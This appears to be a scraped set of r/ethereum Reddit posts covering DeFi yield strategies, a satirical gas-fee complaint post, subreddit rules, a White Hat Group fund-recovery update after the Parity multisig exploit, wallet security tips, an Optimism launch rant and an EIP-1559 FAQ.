Stake with extra steps.    * In both systems, the goal is reach consensus in a sybil-resistant way. Spending time and energy by computing hashes over and over is just the easiest way to reach that goal. But if we can achieve that goal (randomness + verifiable delay functions) without using the energy of a continent, maybe we should look into it.    * In both systems, whoever has capital gets to earn more capital by producing more blocks. (Except in Proof of Stake, everyone earns at the same rate, proportional to how much they stake)    * In both systems, the capital that someone has at stake (mining rigs vs coins directly) is a good indicative that they will play by the rules.    * By design, [Ethereum doesn't have on-chain governance](https://docs.ethhub.io/ethereum-basics/governance/#on-chain-governance). This means that the people with the most coins can't change the rules under PoS any more than the people with the most hash rate can change the rules under PoW.    * Just like there are mining pools, there are staking pools.

Despite being at its inception, with currently more than $40 billion in total value locked (TVL) '[1'], there exist already plenty of opportunities for you to make your idle crypto tokens do the hard work for you to earn some interest. Some of the strategies offer a high risk-reward ratio, whereas some are rather safer. Many people do not know where to start with DeFi because the term itself is a buzzword (e.g., similar to the term BigData) with ambiguous meanings that get people easily lost. DeFi encapsulates various decentralized financial services whose functionality is immutable and persisted on (Ethereum) blockchain, which simply means these services are *accessible to anyone under the same rules and conditions*, which is a huge difference from traditional financial (tradFi) services. DeFi offers various strategies and this extensive guide should outline and uncover the most common earning strategies‚Äîincluding advantages and disadvantages‚Äîin the Ethereum ecosystem. The strategies proceed from the more mainstream and community-approved ones to more advanced ones, concluding with inspiring platforms and trends.**CONTENTS**1. Staking   1. Staking ETH 2.0   2. Staking ERC-20 tokens2. Lending   1. Stablecoin lending   2. wETH and wBTC lending3. Liquidity providing4. Yield and reward farming5. Miscellaneous: yield-bearing NTF¬¥s, synthetic assets, future yield markets, self-paying loans6. Links and resources**1 STAKING**This is not DeFi per se, but to make the list complete, I will start with this, as ETH 2.0 staking is the *most important strategy* that can not only grant you passive income but also helps *keep the network decentralized and safe*. Also, the rewards compared to traditional finance are very appealing.**1.1 ETH 2.0 staking**    rewards: ~8% APRThere has been written a lot about staking already, for those who are interested to read more, the best start is Etehreum official website '[2']. Several variants exist (self, validator-as-a-service, stake pools, custody, exchange) each of which suits better for people at different skill levels or involvement.|'[+'] Ultimate HODL strategy|'[-'] Tokens are locked indefinitely||:-|:-||'[+'] Low-risk strategy as this functionality is supported natively in the ETH protocol|'[-'] Inactivity penalties (rather low) for offline time, risk of slashing for misconfiguration|**1.2 Staking ERC-20 tokens**Tokens: *Aave (LEND) '[3'], Synthetix (SNX) '[4'], Sushi '[5'], Curve (CRV) '[6'], Badger '[7'], The Graph (GRT) '[8'], and many others...)*    rewards: various, ranging from 3% APRThere exist many tokens on Ethereum that incentivize users to lock their tokens to earn staking rewards for various activities: computation (e.g., verifying transactions), asset collateralization, governance‚Äîor no activity at all ('~reward distribution tokens).|'[+'] Earning interest on your favorite coins|'[-'] Risk of token price depreciation in projects that are not mainstream or that have a long-term token issuance scheme||:-|:-|**2 LENDING**dApps: *Compound '[9'], Aave'[10']*You can provide your tokens to be lent to borrowers at (usually variable) interest rates. Some exchanges and centralized services offer these services as well. Lending rewards are typically low for leading crypto projects (ETH, wBTC) but are very interesting for stablecoins.**2.1 Stablecoin lending**    rewards: 3‚Äì20% APR, up to 30% APYYou lock your stablecoins into a vault. All the tokens in the vault earn the same reward. The interest rate fluctuates depending on the demand. Usually, in bull markets, the APR is higher than in bear markets.  The reward is around 3-20% APR but compounding these rewards can slightly improve the rates, supposing the provider offers in-built compounding solutions (otherwise it does not pay-off to pay the high TX fees to claim rewards repeatedly).|'[+'] Better rates compared to tradFi, but essentially on the same asset (dollars)|'[+'] Low-risk strategy only depending on external factors (stablecoin losing peg)||:-|:-||'[+/-'] Stablecoins keep their price (disadvantage in bull markets, advantage in bear markets)||**2.2 ETH, wETH, wBTC lending**    rewards: 0.15‚Äì3% APRWrapped ETH (ETH is not ERC-20 token) and wrapped BTC (wBTC, renBTC) can be lend or staked to provide a yield that is in general rather low, but for holders with bigger stacks, it can be a very effective way to earn stable income on the two most mainstream cryptocurrencies.|'[+'] You HODL your crypto and you get a small additional income||:-|**3 LIQUIDITY PROVIDING**dApps: *uniswap'[11'], sushi'[12'], 1inch'[13'], Loopring'[14'] (L2)*    rewards: up to 100%¬¥s APR (with rewards)Decentralized exchanges (DEX) run automated liquidity pools in order to facilitate the swaps (i.e., exchange trades). Users can provide liquidity for a DEX-traded pair by locking both assets to the pool, at 1:1 volume at their current corresponding price ratio. By locking the assets, you are eligible to earn the fixed fees (around 0.3%) of every trade, proportional to your stake in the liquidity pool. It makes sense to lock assets that you want to hold anyways and in the long-term, e.g., ETH/stablecoin pairs. New pairs are very often incentivized in providing liquidity by offering rewards schemes.|'[+'] Acquiring a reasonable proportion of the pool that has high trading volume can generate interesting profits|'[-'] Inter-pair token price fluctuations or decline to $0 lead to permanent and impermanent losses||:-|:-||'[+'] Many liquidity pools are incentivized by token providers or DEXes by additional token rewards that might severely boost the interest|'[-'] Pools with low or no liquidity provide unstable ratios|**4 YIELD FARMING**dApps: *yearn'[15'], curve'[6'], badger'[16'], harvest.finance'[17'], alphahomora'[18'] (leveraged farming), and many others...*    rewards: up to 100%¬¥s APYIn typical staking, lending, or liquidity-providing scenarios, there is no compounding. In other words, you have to claim your rewards manually to earn them and re-stake them to compound your interests.  Some of the farming protocols collect the rewards for you. Yield farming basically removes or socializes the transaction fees to claim the rewards, which means that your earned interest is continuously compounding which increases the APR (to APY) without the need of repeatedly interacting with the smart contract which is expensive. Some aggressive yield farming strategies focus on harvesting both yields AND rewards from various protocols and compound all of them, which can make them very profitable in short term.|'[+'] Very high rewards (100+% APY is not problem)|'[-'] Some farmed assets cease to exist leaving you with permanent losses||:-|:-||'[+'] Farming aggregators (e.g., harvest.finance) offer multiple strategies and additionally offer interesting reward tokenomics|'[-'] Many strategies are short term only and are not worth paying high TX fees|**5 MISCELLANEOUS**There are many wonderful projects around that attract and deserve attention and offer plausible earning strategies.**a) Yield farming on non-fungible tokens (NFT)**dApps: *Syncbonds'[19'], VeryNifty'[20']*Reward generating NFT tokens. Cryptobonds'[19'] are tradable reward-generating NFTs that lock up interest-bearing liquidity tokens. You can emit your own bond, participate in emitting one with others, or buy already emitted bonds on the open market.With VeryNifty'[20'], you can wrap your NFTS and turn them into vNFTs that earn you interest in the MUSE token. Careful, conditions apply that might burn your NTFs. There is a [uniswap pool](https://app.uniswap.org/#/add/0xc2BdE1A2fA26890c8E6AcB10C91CC6D9c11F4a73/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) to stake and generate yields and trade HashMasks.**b) Synthetic assets**dApps: *Synthetix '[21'], Mirror'[22']*Synthetic assets are derivatives that are incentivized to hold the price peg to the underlying asset (stock, fund, commodity). The main advantage of 'synths' is that anyone can get immutable exposure to any asset at any time (looking at you Robinhood traders). The disadvantage is that you do not really own the stock so you can not partake in ongoing short squeeze (looking at you GME apes). Ensuring the collateral to back up the synthetic asset pair with stablecoin can earn you good rewards while exposing you to the stock at the same time. The leading projects are Synthetix'[21'] and Mirror.finance'[22'] that uses its Terra UST cross-chain stablecoin.**c) Future yield tokenization**dApps: *APwine'[23'], Syncbonds'[19']*Imagine you can stake your tokens to gain future yields without locking the tokens and imagine you can sell these interest-bearing tokens INCLUDING its future yield in advance (for some discount, or even premium if you are lucky or smart). Sounds like a Matrix loophole. The markets are so far rather small, but the APwine'[23'] project is worth keeping eye on.**d) Self-paying loans - alchemix**dApps: *Alchemix'[24']*Alchemix'[24'] lets you take loans that do not generate debt for you but yield. You deposit a certain amount of crypto as collateral and you are able to withdraw up to its half as 'a loan to yourself'. The other half is getting paid automatically by farming strategies.**6 LINKS AND RESOURCES*** '[1'] [https://defipulse.com/](https://defipulse.com/) '- total value locked overview* '[2'] [https://ethereum.org/en/eth2/staking/](https://ethereum.org/en/eth2/staking/) '- ETH 2.0 staking* '[3'] [https://aave.com/](https://aave.com/) '- lending platform, governance and reward token* '[4'] [https://synthetix.io/](https://synthetix.io/) '- synthetic assets, collateral and value peg token* '[5'] [https://www.sushi.com/](https://www.sushi.com/) '- decentralized exchange with farming and reward strategies* '[6'] [https://curve.fi/](https://curve.fi/) '- yield farming including BTC strategies* '[7'] [https://badger.finance/](https://badger.finance/) '- BTC strategies on Ethereum* '[8'] [https://thegraph.com/](https://thegraph.com/) '- Blockchain analytical data computation and providing platform* '[9'] [https://app.compound.finance/](https://app.compound.finance/) '- lending platform* '[10'] [https://app.aave.com/](https://app.aave.com/) '- lending platform* '[11'] [https://app.uniswap.org/](https://app.uniswap.org/) '- decentralized exchange* '[12'] [https://app.sushi.com/](https://app.sushi.com/) '- decentralized exchange* '[13'] [https://1inch.exchange/](https://1inch.exchange/#/) '- decentralized exchange* 14'] [https://exchange.loopring.io/swap](https://exchange.loopring.io/swap) '- decentralized exchange* '[15'] [https://yearn.finance/vaults/](https://yearn.finance/vaults/) '- yield farming* '[16'] [https://app.badger.finance/](https://app.badger.finance/) '- yield farming (BTC strategies)* '[17'] [https://harvest.finance/](https://harvest.finance/) '- yield farming aggregator* '[18'] [https://homora.alphafinance.io/](https://homora.alphafinance.io/) '- leveraged yield farming* '[19'] [https://app.syncbond.com/](https://app.syncbond.com/) '- tradeable yield-bearing NFT bonds* '[20'] [https://gallery.verynifty.io/](https://gallery.verynifty.io/) '- farming NFTs* '[21'] [https://staking.synthetix.io/staking](https://staking.synthetix.io/staking) '- collateral, liquidity, and trading of synthetic assets* '[22'] [https://eth.mirror.finance/](https://eth.mirror.finance/) '- collateral, liquidity, and trading of synthetic assets* '[23'] [https://app.apwine.fi/](https://app.apwine.fi/) '- trading yield-baring tokens with future interest* '[24'] [https://app.alchemix.fi/](https://app.alchemix.fi/) '- self-paying loans**DISCLAIMER**To earn interest in most cases does not mean buying the project's native token but using their platform/dApp.I am not anyhow related to, paid by, or involved with development in any of the mentioned projects or protocols.This is the 1st version (16. 3. 2021).

Let me save you time and give you some basic guidelines to ensure your success. Here are some of the best and most tested methods to farm karma on r/ethereum.**1.GAS TOO HIGH:**Make sure there is $0.5 to $1 in your Metamask account. Then go interact with any Ethereum smart contracts. On your Metamask, go to edit gas, and crank gas limits to 9999999. Then you'll get absurd values like $15,000 for the swap/deposit/withdrawal/whateverthefuckhaveyou. TAKE THE FUCKING SCREENSHOT!!!! You're done. Post it online. GGWP. Fucking ETH is robbing you $15,000 for a $1 transaction, fuck me right?!**2.GAS TOO HIGH:**When minting NFTs, make sure you wait till all NFTs have been fully minted. There's a bug in Metamask that, when an NFT is sold out, you'll receive absurdly high gas like 5 ETH for one mint. Metamask hasn't updated that hole yet, so here's your chance to farm more karma. TAKE THE FUCKING SCREENSHOT of the mint. Post it on Twitter. Fuck me, now Ethereum wants to rob you of your $25k for a fucking jpeg, fuck me right?**3.GAS TOO HIGH:***'Hey guys. WTF?! I'm a new investor with $100 in my wallet. I literally can't do anything right now. Why does it take me $500 to transfer my money anywhere with Etherium??? $500 is literally a lifelong salary in my country here. Most people here earn like $5 a MONTH! WTF IS THIS BULLSHIT. ETHEREUM IS FOR THE RICH ONLY!!!! This is highway robbery. Etherium is only this high because nobody can sell lol lmfao omg.'*That's a pre-made essay you can use to farm karma anywhere you want, be it r/ethereum or r/cc. Just use that framework and add your own twist here and there, you'll get a fuckton of moons and karma in no time. Good luck!**4.GAS TOO HIGH:**Make sure this time you're swapping $5 worth of ETH into some other coins. Remember, the swap needs to be as low as possible or this farming technique won't work! Again, crank gas limits up to 99999. Go to etherscan, check twitter for a hot NFT drop, wait till network hits 1000 gwei for 15 seconds. NOW OPEN YOUR METAMASK ASAP. Go to swap, SCREENSHOT THE FUCKING PICTURE. Now you have proof that Ethereum wants you to pay $10,000 to swap $5 worth of your hard earned money. Fucking robbed, I say! Fuck me sideways and call me Betty, right?**5.GAS TOO HIGH:***'Nobody uses Eartherium anymore. It's too crowded. Too many people are using it. Nobody is using it anymore. I don't understand how Etherium is still a thing. Gas too high!!! Why are people still using it? It's literally dead.'*That's another pre-made essay you can use to get some solid internet points. This essay is meant to prove your undisputable prowess in your understanding of basic supply/demand in economics. You'll get to be a fucking genius and get karma, what's not to like? Spam this every time all the time.**6.GAS TOO HIGH:**Fuck me. Now you're a VC fund with billions under management. Of course Ethereum $50 gas bothers you because you are here for the common man, the average working man, the 9-5 Joes and the housewife Janes, right? Fuck me. It bleeds your fucking croc - I mean, human heart to see 'em unable to pay them gas fees. Fuck me. What do you do? Well, you go on twitter, you say you're abandoning Ethereum, you say Ethereum is for the rich only, and you say all you've ever done was for the greater good of mankind and help everyone achieve financial freedom, with your VC hedge fund, of course. Fuck.'---------------Well, fuck me, that's all I got for you right now. As you can see, those are 6 very diverse and different topics you can pick anytime you want to keep your karma farming techniques varied. You can rotate them whenever you want, it should be enough materials to last you an entire week if you rotate between r/ethereum, r/cc  and other kripto subs. Shouldn't run out of farm materials ever. Good luck, farmers! And remember, everyone loves to hear a good gas story.

These can be used as reasons to remove posts/comments and ban users.### Golden RuleYou are expected to treat everyone with a certain level of respect and refrain from inappropriate behavior. Examples of inappropriate behavior include:- Personal insults- Threats of violence or attempts to organize attacks- Slurs of any kind- Posting people's private informationIf you can't play nice with others, you will not be allowed to post here.### Ether Price, Market, and Mining discussionsDiscussion related to the price of ether, buying, trading, market speculation, or any other price/market talk should be posted on /r/ethtrader, a third-party Subreddit not moderated by us. Besides, keep mining discussion to Subreddits such as /r/EtherMining and obvious ICO advertisements to r/ethinvestor or similar.### Duplicate threadsDuplicate threads may be deleted. It is up to the discretion of the mods.### No spamming or drive by postingSpamming will lead to post deletion and a possible ban. Posts created by accounts that self-delete immediately will be deleted right away - no _drive by posting_.### Using multiple accountsCreating multiple accounts to get around Reddit or Subreddit rules is not allowed and will likely result in a permanent ban.### Misleading titlesPosts with purposely misleading or unsubstantiated titles will be removed.### Karma & age requirements for posting submissionsAll post submissions should be made from accounts at least ten days old with a minimum of 20 comment karma. This is to keep trolls and spam-bots to a minimum. Exceptions may be made on a discretionary basis; please do not message the mods for more information.---## Moderation philosophy---/r/ethereum is a place for the open discussion about the Ethereum software, protocol, distributed applications, and related technologies. As moderators, we are here to make sure the conversation stays civil and productive. We will not censor posts based on personal ideology and welcome constructive discourse.### What we ask our users- Please utilize the up-vote and down-vote buttons. This is a built-in moderation tool that is very powerful.- If you submit a report about a post or comment, please provide as much detail as possible to help us more quickly sort through our reported posts/comments.- Please don't report posts or comments you disagree with, only about things that break the rules.- We welcome discussions about other crypto-currencies and Ethereum implementations, but if the topic is already being extensively covered by other threads, we kindly ask you to consider posting it to a more specific Subreddit. You can check an extensive (but not comprehensive) list of Ethereum-related Subreddits on the ['All Ethereum' Multireddit](https://www.reddit.com/user/all_ethereum/m/all_ethereum).### Moderation logsThe moderation logs are [public and available for review here](http://snew.github.io/r/ethereum/about/log).---## FAQ---- [How would I **explain Ethereum** to a non-technical friend?](https://ethereum.stackexchange.com/q/45)- [What are the Ethereum **disk space needs**?](https://ethereum.stackexchange.com/q/143)- [What is **'gas'** and **transaction fee** in Ethereum?](https://ethereum.stackexchange.com/q/3)- [What is the **total supply** of Ether?](https://ethereum.stackexchange.com/q/443)- [Help with **very slow Mist sync**!](https://ethereum.stackexchange.com/q/603)- [How to **backup** mist wallets?](https://ethereum.stackexchange.com/q/946)- [How do I **backup** my ether accounts?](https://ethereum.stackexchange.com/q/108)- [What is the recommended way to **safely store Ether**?](https://ethereum.stackexchange.com/q/1239)- [How to **reduce the chances** of your Ethereum wallet **getting hacked**?](https://ethereum.stackexchange.com/q/3887)- [How do I **buy Ethereum** with USD?](https://ethereum.stackexchange.com/q/1915)- [How can I get a Geth node to **download the blockchain quickly**?](https://ethereum.stackexchange.com/q/392)- [**How to mine** Ether on GNU + Linux?](https://ethereum.stackexchange.com/q/111)- [**Ropsten** testnet is under kind of attack?

Ethereum was one of the fastest ever graduated Q&A sites in the Stack Exchange network (~ 500 days)!**This is a huge milestone**, not only for Ethereum Stack Exchange, but for the whole Ethereum community. Ethereum joins an elite of 35 technologies which deserve it's own fully-fledged Stack Exchange Q&A site in the network, in one line with communities like [Ubuntu](https://askubuntu.com/), [LaTeX](https://tex.stackexchange.com/), [Blender](https://blender.stackexchange.com/), [Mathematica](https://mathematica.stackexchange.com/), and [Android](https://android.stackexchange.com/) - just to name a few, and not to forget joining one network with popular sites like [Stack Overflow](https://stackoverflow.com/), [Super User](https://superuser.com/), and [Server Fault](https://serverfault.com/).I would like to thank the Stack Exchange team for giving us the chance to field-test the site with a private and public beta, Roman Mandeleil for proposing Ethereum at [Area51](https://area51.stackexchange.com/proposals/89704/ethereum), Hudson Jameson & Joris Bontje & _eth_ for moderating the site, and all the users contributing questions, answers, tags, wikis, votes, flags, and everything else! Thank for making this possible!**But, huh, what does that mean?** The final graduation will be [fulfilled in two steps](https://meta.stackexchange.com/questions/260754/).

This operation was aided directly by over 30 people and indirectly by countless others. Many people have requested/demanded a donation address so we created a donation account following the [Giveth](http://giveth.io/) model, which generates a White Hat Donation Token when it receives ether.Our donations address is `whitehats.eth` which resolves to `0xd556cAF704e39fc728058557a113b226207D2212` it requires a `gasLimit` of 155,000 gas.Half of the donations will go to the 30+ people involved in helping in this specific action, these people will receive non-transferable WHG tokens which will be used to collect their portion of the donations from a withdraw contract once we can test it and obtain everyone's account addresses.The other half of the donations will go to a White Hat Fund to support smart contract security and future White Hat actions, while also acting as a legal contingency fund. **Sadly Not Everyone Was Saved**There were at least two other addresses that utilized this exploit but have not stepped forward to return the funds as far as we know, [the original hacker](https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32) that drained the [Swarm City](https://press.swarm.city/parity-multisig-wallet-exploit-hits-swarm-city-funds-statement-by-the-swarm-city-core-team-d1f3929b4e4e), [Aeternity](https://blog.aeternity.com/parity-multisig-wallet-hack-47cc507d964d), and [Edgeless](https://medium.com/@tomasdraksas/edgeless-response-to-parity-hack-3e35e20ba85c) Multisigs and another [later hacker that was able to grab almost $250k worth of tokens](https://etherscan.io/address/0xdfb692d180cae04bb29b6cd9878ede2ec8e79f45).Of the victims, we have stayed in closest contact with Swarm City, who alerted us of the exploit in the first place, giving us the head start we needed to preserve the funds that we could. Swarm City has [explicitly declined to accept any donations](https://press.swarm.city/follow-up-statement-from-the-swarm-city-core-team-3ab0f1274ad3), saying that if people want to help they can [join their slack](https://slackinvite.swarm.city/) to participate in their efforts to decentralize commerce, and if they still feel compelled to help financially, they can buy their SWT token and hold them.This is just one of many stories from the past week that has reaffirmed our faith in the Ethereum community. We truly have the best community in crypto, which is what attracted us to the project in the first place. This community has always been and will always be Ethereum's strongest asset. **Thank you all!**Edit: /u/bokkypoobah, being the White Hat that he is, has found several other attackers that have yet to step forward to return the funds. :-( [See his well documented expose on this event](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#parity-multisig-recovery-reconciliation) for [the complete list](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#attacking-accounts).",False,The WHG has Returned 100% of the Rescued Funds to their Rightful Owners,u/[deleted],1,902,0.94,https://www.reddit.com/r/ethereum/comments/6qrjr5/the_whg_has_returned_100_of_the_rescued_funds_to/,[]

There is really, really no excuse. https://www.ledgerwallet.com & https://shop.trezor.io/2. If you don't want one of these nifty devices, use cold storage for a majority of your savings. Please. Pretty please.3. **Bookmark your crypto sites.** Use those bookmarks and only those.4. **Turn on 2FA for everything.** Go do it. Right now. Quit your excuses. Choose Google Authenticator over Authy. Don't use your phone number. Then, make sure your phone number is NOT tied to your Google account (look in privacy settings). Turns out, you and your BFF Mr. Hacker can 'recover' access to your account via that number, completely destroying the point of 2FA. *PS: Don't forget to cold-storage your backup words for these 2FA things. It's a huge pain when your phone goes for a swim and your entire life is 2FA'd.* üòä4. **Do not use cloud storage (Dropbox, Drive, iCloud) for storing your keys** [:(]( https://twitter.com/izqui9/status/872364163330428931)Now your keys would only be protected by your cloud storage password. Also, see #4.5. **For Token Sales: do not trust any address except the one posted on the official site.** Bookmark the URL before the sale, get the address from the URL from your bookmark at time of purchase. Do not trust any other source (especially a random bot on Slack). *PS: When are token sales going to start using ENS names?*6. **Double check the URL.** Check it. Then, check it again right before entering any information. This is especially important for any sites that require usernames, passwords, email addresses, private keys, and any other personal information. SSL certs do not mean a site is trustworthy, just that they bought an SSL cert. Not sure about the correct URL? *Cross reference* Reddit, Twitter, Github, Slack and wherever else the project hangs out.7. **Triple check Github URLs.** These are much easier to fake and much easier to miss. Instead of downloading from that random URL on reddit, seek out the URL on your own. Following the developers of these repos on Twitter, friending them on reddit (lol...but seriously it's nice because their name will be orange), or starring said repos on Github helps.6. **Always verify that the site you landed on is legit.** Especially if you are about to entire your private key or download an application. What is legit? A service that people have used for a decent period of time with good results. If the URL has been registered in the last week or the site 'just launched', err on the side of caution and avoid it for a while.8. **Google the service name + 'scam' or 'reviews'.** Scam sites rarely last long. Value real comments by real people over a random blog. Value a *collection* of information over a single source. Understand that legit services will likely have a mix of positive and negative reviews over a long period of time. Scam sites typically have no one talking about them, everyone yelling about how they got robbed, or the most perfect reviews ever. The latter one is just as red of a flag as the first one. 9. **Don't ever run remote-access software (e.g. TeamViewer)** ever...but especially not on a computer with keys on them. The number of security holes in these programs is atrocious. You 2FA your entire life, but then let a single string of characters give someone access to your *entire* computer & every account. üò±10. **Don't click any link regarding anything crypto, money, banking, or a service like Dropbox / Google Drive / Gmail in any email ever.** And if the scammy clickbait was simply too irresistible for you, don't enter any information on the page.11. **Install an adblocker that actually turns off Google/Bing Ads.** I recommend going with [uBlock Orgin](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en). If you are already using Adblock Plus, it does not hide Google Ads from you. Go into your Adblock Plus settings and uncheck the box that says Allow some non-intrusive advertising. 12. **Don't click on advertisements.** With or without an adblocker, you should never, ever click on advertisements.13. **If you have accidentally visited or typed a malicious site, clean out your recent history and autocomplete.** This will prevent you from typing `kra` and having it autocomplete to the malicious `krakken.com`. 14. **No one is giving you free or discounted ETH. Even for completing a survey.** 15. **The guys who just finish their token sale don't want to sell you tokens via Slack DM.** Neither does that smokin' hot 125px x 125px avatar. 16. **Lastly: use your brain.** Think for a moment. Don't assume, ask. Don't blindly follow, question. If something doesn't seem right...if you feel like the luckiest fucker on Earth...or if you find yourself asking, 'I wonder why I haven't seen this on reddit yet', there is likely a reason. üëç----## A note about Ethereum Chamber scam yesterdayAs some of you are aware, there was a scam site yesterday that was a clone of MyEtherWallet.com, but red. I was alerted to it via a Facebook message ~5am from a diligent user. That is one of 3 messages I received about it before our tweet went up at 1pm, not including the 5 from our internal team (thank goodness someone realizes our site isn't red!)Since that site has come to light, a number of folks have mentioned things like, 'Oh yeah I saw it, I figured you guys were just rebranding' or 'Oh weird. Yeah I figured it was a scam.'This site, which *I* thought was only a paid CoinTelgraph blurb at the time, was actually on a large number of Bitcoin blogs: podcasts, blogs, news sites, Twitter, the works. How does this happen? How do a number of bloggers promote a direct (red) clone of MEW, people see it, and no one says anything? *(The fact that all these bloggers & 'news' organizations gleefully accepted money from a wallet site without Googling 'ether wallet' or 'Name of the Site' is a far too angry and long rant, but should not go unnoticed.)* Anyways!---## While the above post is all about the steps *you* should take to protect yourself, there is another one that is even more important:## Look out for one anotherScammers thrive because they have victims -- because they know they can throw a stupid website out there and people will click it. Stop thinking, 'Well, they shouldn't have clicked it' and start doing what you can to prevent people from making a mistake that will cost them their hard-earned coins. - If you notice something looks like MEW, say *'Hey, that looks like a clone of MEW! I wonder if they've seen it?'*- If you think that Github URL looks weird but you don't have the time to check, throw a *'hey u sure thats rite url?'* up there. - If that reddit post is an unheard of wallet, leave a comment and report it with a *'??????????'* in the report reason.- If the Token Sale you are participating it doesn't tell you explicitly when & where their address will be posted, ask them, in public, over and over again. If its not at least 24 hours before the Token Sale, question that choice, in public, over and over again. - Remind people about best practices! If you've been visiting /r/ethereum for more than 3 months, you have 3 months on 25% of the people here. You are a bloody expert now. Time to put on your big boy pants:- *'@nooboob Remember the address will be posted on their website, NOT in this Slack.'*- *'It looks like this is an okay link, but it's not a good idea to click or install things from a random user on reddit. It could be malware.'***There needs to be more due diligence everywhere, but this is easier diligence than most. It requires no advance knowledge or skills. You don't even have to be able to write good. Stay aware, trust your gut, ask more questions, trust the internet less, and google the fuck out of everything.**Stay safe out there. üíñ",False,[UPDATED] It's Time to Get Real: Stop Relying on Third Parties to Protect You & Your Funds.

Interestingly, when recently asked on Discord why Optimism needed to wait until they (synthetix, uniswap, chainlink) were ready, Jinglan said:'We especially want things like token bridges, infrastructure providers, block explorers, multisigs, wallets, etc. to be ready for launch so people can use L2 as safely as possible . . . [i]n order for a project to upgrade safely, we need to integrate a multisig prior to launch. Other things in this category include oracles, indexers, etc.'Just wow. And chainlink hasn't deployed anything yet?!  Notably, Chainlink already has price feeds on xDai and their oracles are ready as well (with documentation). But were told Chainlink was an 'integration partner, but for the last 6 months they've done basically nothing? No price feeds. Not even oracles? Amazing. Soooo just barely a month ago, Jinglan and company didn't have any idea that mainnet wouldn't be ready in March? That Chainlink, an integration partner doesn't even have price feeds, but that mainnet would be ready in March? They didn't even have block explorers or wallets ready? Lol. Smh.  I understand that projects get delayed, but this is pretty alarming. How can we possibly trust or rely on anything Optimism says at this rate? This whole situation is unfortunate and unacceptable at this point. It's no wonder xDai and polygon are eating into Ethereum's market share. Jinglan, can you get it together please? P.S. I love ETH and have been hodling since 2017. I'm just pissed at the lack of urgency surrounding L2 solutions and and how this is panning out.EDIT: downvote me all you want, still doesn't change the facts of the matter.

On Ethereum, minimum fees are typically around 2 gwei (10^9 gwei = 1 ETH), but sometimes go up to 20-50 gwei and have even on one occasion gone up to over 200 gwei: https://etherscan.io/chart/gasprice. This clearly creates many inefficiencies, because it&#39;s absurd to suggest that the cost incurred by the network from accepting one more transaction into a block actually is 100x more when gas prices are 200 gwei than when they are 2 gwei; in both cases, it&#39;s a difference between 8 million gas and 8.02 million gas.* **Inefficiencies of first price auctions**: see https://ethresear.ch/t/first-and-second-price-auctions-and-improved-transaction-fee-markets/2410 for a detailed writeup. In short, the current approach, where transaction senders publish a transaction with a fee, miners choose the highest-paying transactions, and everyone pays what they bid, is well-known in mechanism design literature to be highly inefficient, and so complex fee estimation algorithms are required, and even these algorithms often end up not working very well, leading to frequent fee overpayment. See also https://blog.bitgo.com/the-challenges-of-bitcoin-transaction-fee-estimation-e47a64a61c72 for a Bitcoin core developer&#39;s description of the challenges involved in fee estimation in the status quo.* **Instability of blockchains with no block reward**: in the long run, blockchains where there is no issuance (including Bitcoin and Zcash) at present intend to switch to rewarding miners entirely through transaction fees. However, there are [known results](http://randomwalker.info/publications/mining_CCS.pdf) showing that this likely leads to a lot of instability, incentivizing mining &#34;sister blocks&#34; that steal transaction fees, opening up much stronger selfish mining attack vectors, and more. There is at present no good mitigation for this.EIP 1559 has these benefits:* It mitigates the economic inefficiencies from social cost mismatch due to fee volatility. There is a fairly nuanced economic argument here; see particularly pages 16-20 of the paper linked in https://ethresear.ch/t/draft-position-paper-on-resource-pricing/2838 (though I recommend reading the whole paper) for a detailed argument of why this is the case. Intuitively, the adjusting fee mechanism works like a fixed fee in the short run and a cap in the long run, and it turns out that because of [arguments from Martin Weitzman&#39;s 1974 paper](https://scholar.harvard.edu/weitzman/files/prices_vs_quantities.pdf) fixed fees are likely better than a cap in the circumstances that basically all public blockchains are in today and will likely continue to be in.* It replaces the auction with a fixed price sale (except during short periods where blocks fill up completely until fees catch up), eliminating first-price-auction inefficiencies and making fee estimation extremely simple: calculate the fee `f` for the next block, if you can afford it pay it, otherwise don&#39;t.* It creates a mechanism similar to a permanent block reward (the 1/N coming from the pot), mitigating many of the instability issues with fee-only blockchains without requiring actual permanent issuance.-----------------------Another underrated benefit of EIP 1559 is that it makes gas prices _securely measurable_. Today, just looking at gas prices on chain and using them as an index is exploitable, because miners could include either very-low-fee or very-high-fee dummy transactions where the fee would go to themselves. But under EIP 1559, the BASEFEE can only be manipulated at high cost, as dummy transactions would requre even the miner to pay fees (that get burned).## Are current fee markets really that inefficient?Yes. The difference between average gasprice and 10th percentile gasprice in a regular block is something like 3x for median and 5-8x for mean. People needlessly overpay massively.Everyone who does not overpay suffers a delay of 1-2 minutes or even longer, and this delay does not actually benefit anyone; the total load to the chain is the same regardless of whether a given unit of load hits the chain at time N or time N + 60. **There is no actual social benefit from participants &#34;expressing a low time preference&#34;** in the fee market mechanism, at least under normal conditions; it is pure deadweight loss. We would all be better off if more transactions were just included immediately, which EIP 1559 allows.## Why not just use a second price(or kth price auction) to solve the first-price-auction inefficiencies?Kth-price auctions (where everyone pays a gasprice equal to the lowest gasprice that was included in the block) are indeed &#34;efficient&#34; in a traditional economic analysis*, but have the flaw that they are vulnerable to collusion.* Yes of course technically you want to use the _highest gasprice not included_ in the block; but in practice given that most ethereum blocks have hundreds of transactions the difference would be negligible.## Might EIP 1559 run the risk of over-stressing nodes and miners during periods of high usage?EIP 1559 can at most increase block size by 2x, even in the short term. Each &#34;full block&#34; (ie. a block whose gas is 2x the TARGET) increases the BASEFEE by 1.125x, so a series of constant full blocks will increase the gas price by a factor of 10 every ~20 blocks (~4.3 min on average). Hence, periods of heavy on-chain load will not realistically last longer than ~5 minutes.Note that currently, periods of double load that last 5 minutes already happen by random chance roughly once per ~63888 blocks (~10 days) because of variance in the rate of block production. So the introduction of EIP 1559 would not bring in any unprecedented level of load to the system.Additionally, the gas limit being only 10 million and not higher is justified to a large extent not by hard network limits (uncle rates are [near historic lows](https://etherscan.io/chart/uncles), though risks to non-miner nodes such as bootstrap nodes, may be higher), but by concerns that are fundamentally long-term in character:* Centralization risk of somewhat higher uncle rates: if uncle rates shoot up to 20%, that would disproportionately benefit well-connected large pools* Limits to state size* Difficulty of syncing after a short period offlineIn all three of these cases, what matters is not the upper bound on capacity within a very short window of time, but rather the long-term average capacity. Uncle 